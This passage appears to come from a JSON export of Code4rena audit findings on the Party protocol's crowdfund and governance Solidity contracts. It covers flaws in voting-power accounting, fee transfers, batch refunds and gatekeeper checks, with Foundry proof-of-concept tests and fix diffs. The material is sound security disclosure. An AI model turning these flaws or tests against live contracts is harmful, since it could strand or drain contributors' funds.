     vm.deal(member2, 1 ether);          // Contribute, should be allowed to update delegate         vm.startPrank(member1);         crowdfund.contribute{ value: 1 ether }(member1, \"\");         vm.stopPrank();          vm.startPrank(member2);         crowdfund.contribute{ value: 1 ether }(member2, \"\");         vm.stopPrank();          skip(7 days);         console.log(party.getGovernanceValues().totalVotingPower);         crowdfund.finalize();         console.log(party.getGovernanceValues().totalVotingPower);          console.log(crowdfund.pendingVotingPower(member1));         console.log(crowdfund.pendingVotingPower(member2));     } ```  See that `totalVotingPower` is increased from `0` to `2e18`.   The voting power of both users is `0.9e18` (10% fee).    Thereby both users together receive a voting power of `1.8e18` which is only 90% of `2e18`.    Therefore it is impossible to reach an unanimous vote.    ## Tools Used VSCode, Foundry  ## Recommended Mitigation Steps The fix is easy:   We must consider the funding fee when increasing the `totalVotingPower`.    Fix:   ```diff diff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol index 4392655..3c11160 100644 --- a/contracts/crowdfund/ETHCrowdfundBase.sol +++ b/contracts/crowdfund/ETHCrowdfundBase.sol @@ -274,10 +274,6 @@ contract ETHCrowdfundBase is Implementation {          // Finalize the crowdfund.          delete expiry;   -        // Update the party's total voting power. -        uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4; -        party.increaseTotalVotingPower(newVotingPower); -          // Transfer fee to recipient if applicable.          address payable fundingSplitRecipient_ = fundingSplitRecipient;          uint16 fundingSplitBps_ = fundingSplitBps; @@ -287,6 +283,10 @@ contract ETHCrowdfundBase is Implementation {              fundingSplitRecipient_.transferEth(feeAmount);          }   +        // Update the party's total voting power. +        uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4; +        party.increaseTotalVotingPower(newVotingPower); +                  // Transfer ETH to the party.          payable(address(party)).transferEth(totalContributions_);      } ```   "}, {"title": "PartyGovernanceNFT.sol: burn function does not reduce totalVotingPower making it impossible to reach unanimous votes", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/10", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-06"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L201-L224   # Vulnerability details  ## Impact With the new version of the Party protocol the [`PartyGovernanceNFT.burn`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L201-L224) function has been introduced.    This function is used to burn party cards.    According to the sponsor the initial purpose of this function was to enable the [`InitialETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/InitialETHCrowdfund.sol) contract (the `burn` function is needed for refunds).    Later on they decided to allow any user to call this function and to burn their party cards.    The second use case when a regular user burns his party card is when the issue occurs.    The `PartyGovernanceNFT.burn` function does not decrease `totalVotingPower` which makes it impossible to reach an unanimous vote after a call to this function and it makes remaining votes of existing users less valuable than they should be.    ## Proof of Concept Let's look at the `PartyGovernanceNFT.burn` function:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L201-L224)   ```solidity function burn(uint256 tokenId) external onlyDelegateCall {     address owner = ownerOf(tokenId);     if (         msg.sender != owner &&         getApproved[tokenId] != msg.sender &&         !isApprovedForAll[owner][msg.sender]     ) {         // Allow minter to burn cards if the total voting power has not yet         // been set (e.g. for initial crowdfunds) meaning the party has not         // yet started.         uint96 totalVotingPower = _governanceValues.totalVotingPower;         if (totalVotingPower != 0 || !isAuthority[msg.sender]) {             revert UnauthorizedToBurnError();         }     }       uint96 votingPower = votingPowerByTokenId[tokenId].safeCastUint256ToUint96();     mintedVotingPower -= votingPower;     delete votingPowerByTokenId[tokenId];       _adjustVotingPower(owner, -votingPower.safeCastUint96ToInt192(), address(0));       _burn(tokenId); } ```  It burns the party card specified by the `tokenId` parameter and makes the appropriate changes to the voting power of the owner (by calling `_adjustVotingPower`) and to `mintedVotingPower`.    But it does not reduce `totalVotingPower` which remains untouched by this function.    In case this function is called by `InitialETHCrowdfund` it is intended that `totalVotingPower` is not reduced. In this case the `burn` function is only called when the initial crowdfund is lost and `totalVotingPower` hasn't even been increased so it is still `0` (the initial value).    But why is it an issue when a regular user calls this function?    Let's consider the following scenario:    ``` Alice: 100 Votes Bob: 100 Votes Chris: 100 Votes  totalVotingPower = 300 Votes ```  Now Alice decides to burn half of her voting power:    ``` Alice: 50 Votes Bob: 100 Votes Chris: 100 Votes  totalVotingPower = 300 Votes ```  Now it is easy to see why it is a problem that `totalVotingPower` is not reduced.    It is impossible to reach an unanimous vote because even if all users vote there is only a `(250/300) = ~83%` agreement.    One vote only represents `1/300 = ~ 0.33%` of all votes even though it should represent `1/250 = 0.4%` of all votes. And thereby votes are less valuable than they should be.    You can see in the following test that `totalVotingPower` stays unaffected even though `voter1` burns his party card which represents a third of all votes.    (Add the test to the `PartyGovernanceNFTUnit.sol` test file and add this import: `import \"../../contracts/party/PartyGovernance.sol\";` to access the `GovernanceValues` struct ).    ```solidity function test_canntReachUnanimousVoteAfterBurning() external {     _initGovernance();     address voter1 = _randomAddress();     address voter2 = _randomAddress();     address voter3 = _randomAddress();     uint256 vp = defaultGovernanceOpts.totalVotingPower / 3;     uint256 token1 = nft.mint(voter1, vp, voter1);     uint256 token2 = nft.mint(voter2, vp, voter2);     uint256 token3 = nft.mint(voter3, vp, voter3);      assertEq(nft.mintedVotingPower(), vp*3);     assertEq(nft.getCurrentVotingPower(voter1), vp);      PartyGovernance.GovernanceValues memory gv = nft.getGovernanceValues();     console.log(gv.totalVotingPower);      vm.prank(voter1);     nft.burn(token1);     gv = nft.getGovernanceValues();     // totalVotingPower stays the same     console.log(gv.totalVotingPower); } ```  The remaining two voters will not be able to reach unanimous vote since the `_isUnanimousVotes` function is called with `totalVotingPower` as the total votes with which to calculate the percentage.    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L988)   ```solidity if (_isUnanimousVotes(pv.votes, _governanceValues.totalVotingPower)) { ```  [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L1024)   ```solidity if (_isUnanimousVotes(pv.votes, gv.totalVotingPower)) { ```  ## Tools Used VSCode  ## Recommended Mitigation Steps It is important to understand that when `InitialETHCrowdfund` calls the `burn` function it is intended that `totalVotingPower` is not reduced.    So we need to differentiate these two cases.    Fix:   ```diff diff --git a/contracts/party/PartyGovernanceNFT.sol b/contracts/party/PartyGovernanceNFT.sol index 9ccfa1f..d382d0e 100644 --- a/contracts/party/PartyGovernanceNFT.sol +++ b/contracts/party/PartyGovernanceNFT.sol @@ -200,6 +200,7 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {      /// @param tokenId The ID of the NFT to burn.      function burn(uint256 tokenId) external onlyDelegateCall {          address owner = ownerOf(tokenId); +        uint96 totalVotingPower = _governanceValues.totalVotingPower;          if (              msg.sender != owner &&              getApproved[tokenId] != msg.sender && @@ -208,7 +209,6 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {              // Allow minter to burn cards if the total voting power has not yet              // been set (e.g. for initial crowdfunds) meaning the party has not              // yet started. -            uint96 totalVotingPower = _governanceValues.totalVotingPower;              if (totalVotingPower != 0 || !isAuthority[msg.sender]) {                  revert UnauthorizedToBurnError();              } @@ -218,6 +218,10 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {          mintedVotingPower -= votingPower;          delete votingPowerByTokenId[tokenId];   +        if (totalVotingPower != 0 || !isAuthority[msg.sender]) { +            _governanceValues.totalVotingPower = totalVotingPower - votingPower; +        } +          _adjustVotingPower(owner, -votingPower.safeCastUint96ToInt192(), address(0));            _burn(tokenId); ```  Also note that the `|| !isAuthority[msg.sender]` part of the condition is important.   It ensures that if we are not yet in the governance phase, i.e. `totalVotingPower == 0` and a user calls the `burn` function he cannot burn his party card. This is because the `totalVotingPower - votingPower` subtraction results in an underflow.    This ensures that in the pre-governance phase a user cannot accidentally burn his party card. He can only burn it via the `InitialETHCrowdfund` contract which ensures the user gets his ETH refund.    "}, {"title": "totalVotingPower needs to be snapshotted for each proposal because it can change and thereby affect consensus when accepting / vetoing proposals", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/9", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-07"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L598-L605 https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L46-L51   # Vulnerability details  ## Impact This issue does not manifest itself in a limited segment of the code.    Instead it spans multiple contracts and derives its impact from the interaction of these contracts.    In the PoC section I will do my best in explaining how this results in an issue.    I discussed this with the sponsor and they explained to me that this issue is due to a PR that has unintentionally not been merged.    ![Discord message](https://user-images.githubusercontent.com/118979828/231990051-b9f731f1-1678-43e3-81e4-7ec0164bdc10.png)   So they have already written the code that is necessary to fix this issue. It's just not been merged with this branch. So since the sponsor knows about this already and it's just the PR that has gone missing it's not necessary for me to provide the full Solidity code to fix this issue.    In short, this issue is due to the fact that the `totalVotingPower` is not snapshotted when a proposal is created.    The votes that are used to vote for a proposal (or veto it) are based on a specific snapshot (1 block prior to the proposal being created).    When the `totalVotingPower` changes this leads to unintended consequences.    When `totalVotingPower` decreases, votes become more valuable than they should be.    And when `totalVotingPower` increases, votes become less valuable than they should be.    ## Proof of Concept When a proposal is created via the [`PartyGovernance.propose`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L527-L548) function, the proposal's `proposedTime` is set:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L537-L543)   ```solidity ProposalStateValues({     proposedTime: uint40(block.timestamp),     passedTime: 0,     executedTime: 0,     completedTime: 0,     votes: 0 }), ```  When users then vote in order to accept the proposal or veto the proposal, their votes are based on the snapshot at the `proposedTime - 1` timestamp.    We can see this in the `PartyGovernance.accept` function:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L592)   ```solidity uint96 votingPower = getVotingPowerAt(msg.sender, values.proposedTime - 1, snapIndex); ```  And we can see it in the `VetoProposal.voteToVeto` function:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L37-L41)   ```solidity uint96 votingPower = party.getVotingPowerAt(     msg.sender,     proposalValues.proposedTime - 1,     snapIndex ); ```  However the `totalVotingPower` to determine whether enough votes have been collected is the current `totalVotingPower`:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L598-L605)   ```solidity if (     values.passedTime == 0 &&     _areVotesPassing(         values.votes,         _governanceValues.totalVotingPower,         _governanceValues.passThresholdBps     ) ) { ```  [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L46-L51)   ```solidity if (     _areVotesPassing(         newVotes,         governanceValues.totalVotingPower,         governanceValues.passThresholdBps     ) ```  The `totalVotingPower` is not constant. It can increase and decrease.    Now we can understand the issue. The `totalVotingPower` must be based on the same time as the votes (i.e. `proposedTime - 1`).    Let's look at a scenario:    ``` At the time of proposal creation (proposedTime - 1):  Alice: 100 Votes Bob: 50 Votes Chris: 50 Votes  totalVotingPower=200 ```  Let's say 80% of votes are necessary for the proposal to pass.    Now the `totalVotingPower` is increased (e.g. by a `ReraiseETHCrowdfund`) since David now has 100 Votes:    ``` Alice: 100 Votes Bob: 50 Votes Chris: 50 Votes David: 100 Votes   totalVotingPower=300 ```  Now it is impossible for the proposal to pass.    The proposal needs 80% of 300 Votes which is 240 Votes. But the votes are used from the old snapshot and there were only 200 Votes.    The old `totalVotingPower` should have been used (200 Votes instead of 300 Votes).    Similarly there is an issue when `totalVotingPower` decreases:    ``` Alice: 100 Votes Bob: 50 Votes Chris: 0 Votes  totalVotingPower=150 ```  If 60% of the votes are necessary for the proposal to pass, Alice can make the proposal pass on her own because `totalVotingPower=150` is used even though the old `totalVotingPower=200` should be used.     ## Tools Used VSCode  ## Recommended Mitigation Steps As explained above the sponsor already has the code to implement snapshotting the `totalVotingPower`.    In short the following changes need to be made:    1. snapshot `totalVotingPower` whenever it is changed  2. Whenever `totalVotingPower` is used to calculate whether a proposal is accepted / vetoed, the snapshot should be used  "}, {"title": "ETHCrowdfundBase.sol: all funds are lost when fee recipient cannot receive ETH", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/8", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-08"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273-L292   # Vulnerability details  ## Impact In the [`ETHCrowdfundBase`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ETHCrowdfundBase.sol) contract a [`fundingSplitRecipient`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L142) address is configured which receives a percentage of the funds in case the crowdfund is won.    Neither the `fundingSplitRecipient` address nor the `fundingSplitBps` percentage can be changed.    The issue is that the `_finalize` function can only succeed when the fees can be transferred to the recipient.    However the recipient contract may revert when it receives ETH. This causes all ETH in the `ETHCrowdfundBase` contract to be stuck.    ## Proof of Concept When the crowdfund is won the `finalize` function needs to be called which calls `_finalize`:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273-L292)   ```solidity function _finalize(uint96 totalContributions_) internal {     // Finalize the crowdfund.     delete expiry;       // Update the party's total voting power.     uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4;     party.increaseTotalVotingPower(newVotingPower);       // Transfer fee to recipient if applicable.     address payable fundingSplitRecipient_ = fundingSplitRecipient;     uint16 fundingSplitBps_ = fundingSplitBps;     if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {         uint96 feeAmount = (totalContributions_ * fundingSplitBps_) / 1e4;         totalContributions_ -= feeAmount;         fundingSplitRecipient_.transferEth(feeAmount);     }       // Transfer ETH to the party.     payable(address(party)).transferEth(totalContributions_); } ```  Here you can see that the `feeAmount` is transferred to the `fundingSplitRecipient`:    ```solidity fundingSplitRecipient_.transferEth(feeAmount); ```  If the recipient contract reverts, the ETH cannot be transferred and the crowdfund cannot be finalized.    But the users can also not get a refund because the crowdfund is in the `Won` state. So there is no way to get the funds out of the contract which means they are lost. Also the users don't get the voting power that they are supposed to get from the crowdfund.    This could be used in a griefing attack where the `fundingSplitRecipient` is set such that it can be made to revert.    Users that fall into this \"trap\" will lose all their funds. It can also just happen by mistake that a bad `fundingSplitRecipient` is set.    ## Tools Used VSCode  ## Recommended Mitigation Steps I recommend to pay the fees in a separate function such that it is separated from the `_finalize` function.     ```diff diff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol index 4392655..5f68406 100644 --- a/contracts/crowdfund/ETHCrowdfundBase.sol +++ b/contracts/crowdfund/ETHCrowdfundBase.sol @@ -62,6 +62,8 @@ contract ETHCrowdfundBase is Implementation {      error BelowMinimumContributionsError(uint96 contributions, uint96 minContributions);      error AboveMaximumContributionsError(uint96 contributions, uint96 maxContributions);      error ContributingForExistingCardDisabledError(); +    error NotFinalizedError(); +    error FundingFeesAlreadyPaidError();        event Contributed(          address indexed sender, @@ -109,6 +111,8 @@ contract ETHCrowdfundBase is Implementation {      /// @notice The address a contributor is delegating their voting power to.      mapping(address => address) public delegationsByContributor;   +    bool public fundingFeesPaid; +      // Initialize storage for proxy contracts, credit initial contribution (if      // any), and setup gatekeeper.      function _initialize(ETHCrowdfundOptions memory opts) internal { @@ -278,7 +282,20 @@ contract ETHCrowdfundBase is Implementation {          uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4;          party.increaseTotalVotingPower(newVotingPower);   +        // Transfer ETH to the party. +        payable(address(party)).transferEth(totalContributions_); +    } + +    function sendFundingFees() external { +        CrowdfundLifecycle lc = getCrowdfundLifecycle(); +         +        if (lc != CrowdfundLifecycle.Finalized) revert NotFinalizedError(); +        if (fundingFeesPaid) revert FundingFeesAlreadyPaidError(); + +        fundingFeesPaid = true; +          // Transfer fee to recipient if applicable. +        uint96 totalContributions_ = totalContributions;          address payable fundingSplitRecipient_ = fundingSplitRecipient;          uint16 fundingSplitBps_ = fundingSplitBps;          if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) { @@ -286,8 +303,5 @@ contract ETHCrowdfundBase is Implementation {              totalContributions_ -= feeAmount;              fundingSplitRecipient_.transferEth(feeAmount);          } - -        // Transfer ETH to the party. -        payable(address(party)).transferEth(totalContributions_);      }  } ```  Alternatively it may also be an option to just send the fees to the party in case the transfer to the recipient fails.   "}, {"title": "InitialETHCrowdfund + ReraiseETHCrowdfund: batchContributeFor function may not refund ETH which leads to loss of funds", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/7", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "upgraded by judge", "edited-by-warden", "H-07"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L235-L268 https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L174-L202   # Vulnerability details  ## Impact This vulnerability exists in both the [`InitialETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/InitialETHCrowdfund.sol) and [`ReraiseETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol) contracts in exactly the same way.    I will continue this report by explaining the issue in only one contract. The mitigation section however contains the fix for both instances.    The [`batchContributeFor`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L235-L268) function is a wrapper that allows to make multiple calls to `contributeFor` within one function call.    It is possible to specify that this function should not revert when one individual call to `contributeFor` fails by setting `args.revertOnFailure=false`.    The issue is that in this case the ETH for a failed contribution is not refunded which leads a loss of funds for the user calling the function.    Note:   This issue also exists in the [`Crowdfund.batchContributeFor`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/Crowdfund.sol#L367-L385) function which is out of scope. The sponsor knows about this and will fix it.    ## Proof of Concept Let's look at the `batchContributeFor` function:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L235-L268)   ```solidity function batchContributeFor(     BatchContributeForArgs calldata args ) external payable onlyDelegateCall returns (uint96[] memory votingPowers) {     uint256 numContributions = args.recipients.length;     votingPowers = new uint96[](numContributions);       uint256 ethAvailable = msg.value;     for (uint256 i; i < numContributions; ++i) {         ethAvailable -= args.values[i];           (bool s, bytes memory r) = address(this).call{ value: args.values[i] }(             abi.encodeCall(                 this.contributeFor,                 (                     args.tokenIds[i],                     args.recipients[i],                     args.initialDelegates[i],                     args.gateDatas[i]                 )             )         );           if (!s) {             if (args.revertOnFailure) {                 r.rawRevert();             }         } else {             votingPowers[i] = abi.decode(r, (uint96));         }     }       // Refund any unused ETH.     if (ethAvailable > 0) payable(msg.sender).transfer(ethAvailable); } ```  We can see that `ethAvailable` is reduced before every call to `contributeFor`:    ```solidity ethAvailable -= args.values[i]; ```  But it is only checked later if the call was successful:    ```solidity if (!s) {     if (args.revertOnFailure) {         r.rawRevert();     } ```  And if `args.revertOnFailure=false` there is no revert and `ethAvailable` is not increased again.    Therefore the user has to pay for failed contributions.    Add the following test to the `InitialETHCrowdfund.t.sol` test file:    ```solidity function test_batchContributeFor_noETHRefund() public {     InitialETHCrowdfund crowdfund = _createCrowdfund({         initialContribution: 0,         initialContributor: payable(address(0)),         initialDelegate: address(0),         minContributions: 1 ether,         maxContributions: type(uint96).max,         disableContributingForExistingCard: false,         minTotalContributions: 3 ether,         maxTotalContributions: 5 ether,         duration: 7 days,         fundingSplitBps: 0,         fundingSplitRecipient: payable(address(0))     });     Party party = crowdfund.party();      address sender = _randomAddress();     vm.deal(sender, 2.5 ether);      // Batch contribute for     vm.prank(sender);     uint256[] memory tokenIds = new uint256[](3);     address payable[] memory recipients = new address payable[](3);     address[] memory delegates = new address[](3);     uint96[] memory values = new uint96[](3);     bytes[] memory gateDatas = new bytes[](3);     for (uint256 i; i < 3; ++i) {         recipients[i] = _randomAddress();         delegates[i] = _randomAddress();         values[i] = 1 ether;     }      // @audit-info set values[2] = 0.5 ether such that contribution fails (minContribution = 1 ether)     values[2] = 0.5 ether;      uint96[] memory votingPowers = crowdfund.batchContributeFor{ value: 2.5 ether }(         InitialETHCrowdfund.BatchContributeForArgs({             tokenIds: tokenIds,             recipients: recipients,             initialDelegates: delegates,             values: values,             gateDatas: gateDatas,             revertOnFailure: false         })     );      // @audit-info balance of sender is 0 ETH even though 0.5 ETH of the 2.5 ETH should have been refunded     assertEq(address(sender).balance, 0 ether); } ```  The `sender` sends 2.5 ETH and 1 of the 3 contributions fails since `minContribution` is above the amount the `sender` wants to contribute (Note that in practice there are more ways for the contribution to fail).    The sender's balance in the end is 0 ETH which shows that there is no refund.    ## Tools Used VSCode,Foundry  ## Recommended Mitigation Steps The following changes need to be made to the `InitialETHCrowdfund` and `ReraiseETHCrowdfund` contracts:    ```diff diff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol index 8ab3b5c..19e09ac 100644 --- a/contracts/crowdfund/InitialETHCrowdfund.sol +++ b/contracts/crowdfund/InitialETHCrowdfund.sol @@ -240,8 +240,6 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {            uint256 ethAvailable = msg.value;          for (uint256 i; i < numContributions; ++i) { -            ethAvailable -= args.values[i]; -              (bool s, bytes memory r) = address(this).call{ value: args.values[i] }(                  abi.encodeCall(                      this.contributeFor, @@ -260,6 +258,7 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {                  }              } else {                  votingPowers[i] = abi.decode(r, (uint96)); +                ethAvailable -= args.values[i];              }          } ```  ```diff diff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol index 580623d..ad70b27 100644 --- a/contracts/crowdfund/ReraiseETHCrowdfund.sol +++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol @@ -179,8 +179,6 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {            uint256 ethAvailable = msg.value;          for (uint256 i; i < numContributions; ++i) { -            ethAvailable -= args.values[i]; -              (bool s, bytes memory r) = address(this).call{ value: args.values[i] }(                  abi.encodeCall(                      this.contributeFor, @@ -194,6 +192,7 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {                  }              } else {                  votingPowers[i] = abi.decode(r, (uint96)); +                ethAvailable -= args.values[i];              }          } ```  Now `ethAvailable` is only reduced when the call to `contributeFor` was successful.   "}, {"title": "InitialETHCrowdfund + ReraiseETHCrowdfund: Gatekeeper checks wrong address", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/6", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-09"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L282-L293 https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L215-L226   # Vulnerability details  ## Impact This vulnerability exists in both the [`InitialETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/InitialETHCrowdfund.sol) and [`ReraiseETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol) contracts in exactly the same way.    I will continue this report by explaining the issue in only one contract. The mitigation section however contains the fix for both instances.    When making a contribution there is a check with the `gatekeeper` (if it is configured):    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L282-L293)   ```solidity // Must not be blocked by gatekeeper. IGateKeeper _gateKeeper = gateKeeper; if (_gateKeeper != IGateKeeper(address(0))) {     if (!_gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) {         revert NotAllowedByGateKeeperError(             contributor,             _gateKeeper,             gateKeeperId,             gateData         );     } } ```  The issue is that the first argument to the `isAllowed` function is wrong. It is `contributor` but it should be `msg.sender`.    The impact of this is that it will be possible for unauthorized users to make contributions.    ## Proof of Concept Fortunately the new `InitialETHCrowdfund` and `ReraiseETHCrowdfund` contracts are very similar to the already audited other crowdfund contracts.    So we can look into the `Crowdfund.sol` code and see how the `gatekeeper.isAllowed` function should be called:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/Crowdfund.sol#L620-L644)   ```solidity     function _contribute(         address contributor,         address delegate,         uint96 amount,         uint96 previousTotalContributions,         bytes memory gateData     ) private {         if (contributor == address(this)) revert InvalidContributorError();           if (amount == 0) return;           // Must not be blocked by gatekeeper.         {             IGateKeeper _gateKeeper = gateKeeper;             if (_gateKeeper != IGateKeeper(address(0))) {                 if (!_gateKeeper.isAllowed(msg.sender, gateKeeperId, gateData)) {                     revert NotAllowedByGateKeeperError(                         msg.sender,                         _gateKeeper,                         gateKeeperId,                         gateData                     );                 }             }         } ```  We can see that the first argument to the `gatekeeper.isAllowed` function is `msg.sender`.    This means that when User A contributes for User B, the address that is checked is the address of User A and not the address of User B.    The new crowdfund contracts however check `contributor`:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L282-L293)   ```solidity // Must not be blocked by gatekeeper. IGateKeeper _gateKeeper = gateKeeper; if (_gateKeeper != IGateKeeper(address(0))) {     if (!_gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) {         revert NotAllowedByGateKeeperError(             contributor,             _gateKeeper,             gateKeeperId,             gateData         );     } } ```  This means that when User A contributes for User B, the address of User B is checked. However it should be the address of User A (as seen above).    Imagine a situation where three addresses are whitelisted by the gatekeeper:    ``` Alice Bob Chris ```  What should be checked by the gatekeeper is that only Alice, Bob and Chris can make contributions but they should be able to make contributions for everyone (check `msg.sender` instead of contributor).    What is actually checked is that any user can make a contribution but they can only contribute to Alice, Bob and Chris (check contributor instead of `msg.sender`).      ## Tools Used VSCode  ## Recommended Mitigation Steps In both contracts the `msg.sender` needs to be checked instead of `contributor`.    ```diff diff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol index 8ab3b5c..fa8ec5d 100644 --- a/contracts/crowdfund/InitialETHCrowdfund.sol +++ b/contracts/crowdfund/InitialETHCrowdfund.sol @@ -282,9 +282,9 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {          // Must not be blocked by gatekeeper.          IGateKeeper _gateKeeper = gateKeeper;          if (_gateKeeper != IGateKeeper(address(0))) { -            if (!_gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) { +            if (!_gateKeeper.isAllowed(msg.sender, gateKeeperId, gateData)) {                  revert NotAllowedByGateKeeperError( -                    contributor, +                    msg.sender,                      _gateKeeper,                      gateKeeperId,                      gateData ```  ```diff diff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol index 580623d..72f3a20 100644 --- a/contracts/crowdfund/ReraiseETHCrowdfund.sol +++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol @@ -215,9 +215,9 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {          // Must not be blocked by gatekeeper.          IGateKeeper _gateKeeper = gateKeeper;          if (_gateKeeper != IGateKeeper(address(0))) { -            if (!_gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) { +            if (!_gateKeeper.isAllowed(msg.sender, gateKeeperId, gateData)) {                  revert NotAllowedByGateKeeperError( -                    contributor, +                    msg.sender,                      _gateKeeper,                      gateKeeperId,                      gateData ```  On this note it is important to mention that there is also an issue in `Crowdfund.sol` which is out of scope but the issue is of importance here:    The issue is in the `Crowdfund.batchContributeFor` function.   The function calls `this.contributeFor` 